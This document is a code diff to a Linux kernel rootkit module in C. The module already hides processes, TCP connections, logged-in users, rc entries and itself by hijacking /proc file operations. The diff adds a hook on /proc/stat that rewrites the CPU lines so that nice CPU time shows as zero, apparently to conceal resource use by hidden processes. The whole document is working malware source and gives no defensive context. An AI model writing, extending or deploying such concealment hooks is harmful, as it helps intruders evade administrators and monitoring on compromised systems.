@@ -2,12 +2,12 @@
 //      it under the terms of the GNU General Public License as published by
 //      the Free Software Foundation; either version 3 of the License, or
 //      (at your option) any later version.
-//      
+//
 //      This program is distributed in the hope that it will be useful,
 //      but WITHOUT ANY WARRANTY; without even the implied warranty of
 //      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 //      GNU General Public License for more details.
-//      
+//
 //      You should have received a copy of the GNU General Public License
 //      along with this program; if not, write to the Free Software
 //      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
@@ -84,10 +84,10 @@ struct utmp {
 };
 
 /* Injection structs */
-struct inode *pinode, *tinode, *uinode, *rcinode, *modinode;
+struct inode *pinode, *tinode, *uinode, *rcinode, *modinode, *sinode;
 struct proc_dir_entry *modules, *root, *handler, *tcp;
-static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops;
-const struct file_operations *proc_original = 0, *modules_proc_original = 0, *handler_original = 0, *tcp_proc_original = 0, *user_proc_original = 0, *rc_proc_original = 0, *mod_proc_original;
+static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops, stat_fops;
+const struct file_operations *proc_original = 0, *modules_proc_original = 0, *stat_proc_original = 0, *handler_original = 0, *tcp_proc_original = 0, *user_proc_original = 0, *rc_proc_original = 0, *mod_proc_original;
 filldir_t proc_filldir, rc_filldir, mod_filldir;
 
 char *rc_name, *rc_dir, *mod_name, *mod_dir;
@@ -273,6 +273,36 @@ static ssize_t do_read_users(struct file *fp, char __user *buf, size_t sz, loff_
         if(!found)
             i += sizeof(struct utmp);
     }
+    return read;
+}
+
+static ssize_t do_read_stat(struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
+    ssize_t read = stat_proc_original->read(fp, buf, sz, loff);
+    //ssize_t read2; 
+
+    char *ss, *next, *lstart, *new_line;
+    unsigned i = 0, found;
+    //printk("\n----buff(before)----%s\n", buf);
+    while(i < read) {
+        found = 0;
+        lstart = &buf[i];
+        new_line = strchr(lstart, '\n');
+
+        if (strstr(lstart, "cpu") != NULL) {
+            ss = strchr(strchr(lstart + 4, ' ') + 1, ' ') + 1;
+            next = strchr(ss, ' ') + 1;
+            strncpy(ss, "0 ", 2);
+            memmove(ss + 2, next, strlen(buf) - (new_line - next));
+            found = 1;
+            read -= (next - ss - 2);
+        }
+        if(!found) {
+            i += new_line - lstart + 1;
+        } else {
+            i += new_line - lstart - (next - ss - 2) + 1;
+        }
+    }
+    //printk("\n----buff(after)----%s\n", buf);
     return read;
 }
 
@@ -569,6 +599,33 @@ void init_tcp_hide_hook(struct proc_dir_entry *root) {
     tinode->i_fop = &tcp_fops;
 }
 
+void init_nice_hide_hook(struct proc_dir_entry *root) {
+    // search for utmp's inode
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    struct nameidata inode_data;
+    if(path_lookup("/proc/stat", 0, &inode_data))
+        return;
+#else
+    struct path p;
+    if(kern_path("/proc/stat", 0, &p))
+        return;
+    sinode = p.dentry->d_inode;
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+    sinode = inode_data.path.dentry->d_inode;
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+    sinode = inode_data.inode;
+#endif
+
+    if(!sinode)
+        return;
+    stat_fops = *sinode->i_fop;
+    stat_proc_original = sinode->i_fop;
+    stat_fops.read = do_read_stat;
+    sinode->i_fop = &stat_fops;
+}
+
 void init_users_hide_hook(struct proc_dir_entry *root) {
     // search for utmp's inode
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
@@ -666,6 +723,7 @@ static int __init module_init_proc(void) {
     init_tcp_hide_hook(root);
     init_module_hide_hook(root);
     init_users_hide_hook(root);
+    init_nice_hide_hook(root);
     
     hook_proc(root);
     
@@ -689,6 +747,8 @@ static void module_exit_proc(void) {
         rcinode->i_fop = rc_proc_original;
     if(mod_proc_original)
         modinode->i_fop = mod_proc_original;
+    if(stat_proc_original)
+        sinode->i_fop = stat_proc_original;
     show_module();
     if(handler_original) {
         handler->proc_fops = handler_original;
